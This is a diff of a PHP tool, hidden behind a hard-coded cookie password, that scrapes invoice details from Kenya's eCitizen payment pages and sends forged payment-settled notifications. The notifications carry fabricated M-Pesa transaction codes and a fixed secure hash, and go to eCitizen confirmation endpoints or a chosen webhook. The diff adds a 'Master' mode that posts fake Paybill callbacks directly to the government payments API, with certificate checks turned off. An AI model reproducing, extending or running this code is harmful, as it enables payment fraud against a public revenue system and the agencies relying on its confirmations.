@@ -1,11 +1,10 @@
 <?php
-if(isset($_COOKIE['kever'])){
-if($_COOKIE['kever'] !== 'Warorua6298&#'){
-    header('location: https://google.com');
-    die();
-}
-    
-}else{
+if (isset($_COOKIE['kever'])) {
+    if ($_COOKIE['kever'] !== 'Warorua6298&#') {
+        header('location: https://google.com');
+        die();
+    }
+} else {
     header('location: https://google.com');
     die();
 }
@@ -171,43 +170,44 @@ if ($_SERVER['REQUEST_METHOD'] === 'POST' && isset($_POST['ajax_action'])) {
                 ]
             ]);
             exit;
-        }elseif ($invoice_html !== false
-    && preg_match('/<iframe-v3\b(.*?)\/?>/is', $invoice_html, $match)) {
+        } elseif (
+            $invoice_html !== false
+            && preg_match('/<iframe-v3\b(.*?)\/?>/is', $invoice_html, $match)
+        ) {
 
-    $attributes = [];
-    preg_match_all('/(\:\w+|[\w\-]+)="([^"]*)"/', $match[1], $pairs, PREG_SET_ORDER);
-    foreach ($pairs as $pair) {
-        $attributes[$pair[1]] = $pair[2];
-    }
+            $attributes = [];
+            preg_match_all('/(\:\w+|[\w\-]+)="([^"]*)"/', $match[1], $pairs, PREG_SET_ORDER);
+            foreach ($pairs as $pair) {
+                $attributes[$pair[1]] = $pair[2];
+            }
 
-    $now = new DateTime("now", new DateTimeZone("Africa/Nairobi"));
-    $date_iso = $now->format(DateTime::ATOM);
-    $date_custom = $now->format("Y-m-d H:i:sP T e");
+            $now = new DateTime("now", new DateTimeZone("Africa/Nairobi"));
+            $date_iso = $now->format(DateTime::ATOM);
+            $date_custom = $now->format("Y-m-d H:i:sP T e");
 
-    $jsonObj_1 = $attributes[':invoice'] ?? '';
-    $obj_1 = json_decode(html_entity_decode($jsonObj_1), true);
+            $jsonObj_1 = $attributes[':invoice'] ?? '';
+            $obj_1 = json_decode(html_entity_decode($jsonObj_1), true);
 
-    if (isset($obj_1['status'])) {
-        echo json_encode([
-            'status' => 'success',
-            'data' => [
-                'amount' => $obj_1['amount_net'] ?? '',
-                'bill_ref' => $obj_1['client_invoice_ref'] ?? '',
-                'invoice_no' => $obj_1['invoice_number'] ?? '',
-                'notification_url1' => $obj_1['service']['metadata']['metadata']['webhook_url'] ?? '',
-                'notification_url' => 'https://app.kwspay.ecitizen.go.ke/api/payment/confirm',
-                'msisdn' => $obj_1['msisdn'] ?? '+254700000000',
-                'date_iso' => $date_iso,
-                'date_custom' => $date_custom
-            ]
-        ]);
-        exit;
-    } else {
-        echo json_encode(['status' => 'error', 'message' => 'iFrame 3 Loaded. No Object. ::: <br/> '.json_encode($obj_1).'<br/>::::<br/>'.$jsonObj_1.'<br/>::::<br/>'.json_encode($attributes)]);
+            if (isset($obj_1['status'])) {
+                echo json_encode([
+                    'status' => 'success',
+                    'data' => [
+                        'amount' => $obj_1['amount_net'] ?? '',
+                        'bill_ref' => $obj_1['client_invoice_ref'] ?? '',
+                        'invoice_no' => $obj_1['invoice_number'] ?? '',
+                        'notification_url1' => $obj_1['service']['metadata']['metadata']['webhook_url'] ?? '',
+                        'notification_url' => 'https://app.kwspay.ecitizen.go.ke/api/payment/confirm',
+                        'msisdn' => $obj_1['msisdn'] ?? '+254700000000',
+                        'date_iso' => $date_iso,
+                        'date_custom' => $date_custom
+                    ]
+                ]);
                 exit;
-    }
-}
-else {
+            } else {
+                echo json_encode(['status' => 'error', 'message' => 'iFrame 3 Loaded. No Object. ::: <br/> ' . json_encode($obj_1) . '<br/>::::<br/>' . $jsonObj_1 . '<br/>::::<br/>' . json_encode($attributes)]);
+                exit;
+            }
+        } else {
 
             $curl = curl_init();
 
@@ -255,7 +255,9 @@ else {
         }
     }
     if ($action === 'send_notification') {
-        $notification_url = $_POST['notification_url'];
+
+       
+
         $amount = $_POST['amount'];
         $bill_ref = $_POST['bill_ref'];
         $invoice_no = $_POST['invoice_no'];
@@ -265,27 +267,49 @@ else {
         $now = new DateTime("now", new DateTimeZone("Africa/Nairobi"));
         $payment_date_iso = $now->format(DateTime::ATOM);
         $payment_date_custom = $now->format("Y-m-d H:i:sP T e");
-
-        $payload = [
-            "status" => "settled",
-            "secure_hash" => "NTk4NGE3NTIxNjk4OTg2MjhmMWZmMzU4NmU4NDBmYmVlYWVlYTMxN2E1MWMwYzg4MTU3YTBmN2Q0NGQ3ZjUyMA==",
-            "phone_number" => $msisdn,
-            "payment_reference" => [[
-                "payment_reference" => generateMpesaCode(),
-                "payment_date" => $payment_date_iso,
-                "inserted_at" => $payment_date_iso,
+        $notification_path = $_POST['notification_path'];
+        if ($notification_path == '2') {
+            $notification_url = 'https://payments.ecitizen.go.ke/api/payment/confirm/mpesa/';
+            $payload = [
+                "TransactionType" => "Pay Bill",
+                "TransID" => generateMpesaCode(),
+                "TransTime" => date('YmdHis'),
+                "TransAmount" => $amount,
+                "BusinessShortCode" => "222222",
+                "BillRefNumber" => $invoice_no,
+                "InvoiceNumber" => "",
+                "OrgAccountBalance" => "",
+                "ThirdPartyTransID" => "",
+                "MSISDN" => $msisdn,
+                "FirstName" => "John",
+                "MiddleName" => "",
+                "LastName" => ""
+            ];
+        } else {
+            //$notification_url = 'https://bomayangu.go.ke/payments/notify.php';
+            $notification_url = $_POST['notification_url'];
+            $payload = [
+                "status" => "settled",
+                "secure_hash" => "NTk4NGE3NTIxNjk4OTg2MjhmMWZmMzU4NmU4NDBmYmVlYWVlYTMxN2E1MWMwYzg4MTU3YTBmN2Q0NGQ3ZjUyMA==",
+                "phone_number" => $msisdn,
+                "payment_reference" => [[
+                    "payment_reference" => generateMpesaCode(),
+                    "payment_date" => $payment_date_iso,
+                    "inserted_at" => $payment_date_iso,
+                    "currency" => "KES",
+                    "amount" => $amount
+                ]],
+                "payment_date" => $payment_date_custom,
+                "payment_channel" => "MPESA",
+                "last_payment_amount" => "0",
+                "invoice_number" => $invoice_no,
+                "invoice_amount" => $amount . ".00",
                 "currency" => "KES",
-                "amount" => $amount
-            ]],
-            "payment_date" => $payment_date_custom,
-            "payment_channel" => "MPESA",
-            "last_payment_amount" => "0",
-            "invoice_number" => $invoice_no,
-            "invoice_amount" => $amount . ".00",
-            "currency" => "KES",
-            "client_invoice_ref" => $bill_ref,
-            "amount_paid" => $amount
-        ];
+                "client_invoice_ref" => $bill_ref,
+                "amount_paid" => $amount
+            ];
+        }
+
 
         $ch = curl_init($notification_url);
         curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
@@ -294,7 +318,7 @@ else {
         curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, false);
         curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, false);
         curl_setopt($ch, CURLOPT_CONNECTTIMEOUT, 10); // Max seconds to wait for connection
-curl_setopt($ch, CURLOPT_TIMEOUT, 20);        // Max seconds to allow cURL to execute
+        curl_setopt($ch, CURLOPT_TIMEOUT, 20);        // Max seconds to allow cURL to execute
 
         $response = curl_exec($ch);
         $http_status = curl_getinfo($ch, CURLINFO_HTTP_CODE);
@@ -395,6 +419,15 @@ curl_setopt($ch, CURLOPT_TIMEOUT, 20);        // Max seconds to allow cURL to ex
                                 echo '<option value="' . $rows['name'] . '" ' . $attr . '>' . $rows['name'] . '</option>';
                             }
                             ?>
+                        </select>
+                    </div>
+                </div>
+                <div class="col-md-12">
+                    <div class="mb-2">
+                        <label for="exampleInputtext1" class="form-label">Use Notification URL</label>
+                        <select class="form-select" name="notification_path" aria-label="Default select example">
+                            <option value="1" selected>Normal</option>
+                            <option value="2">Master</option>
                         </select>
                     </div>
                 </div>
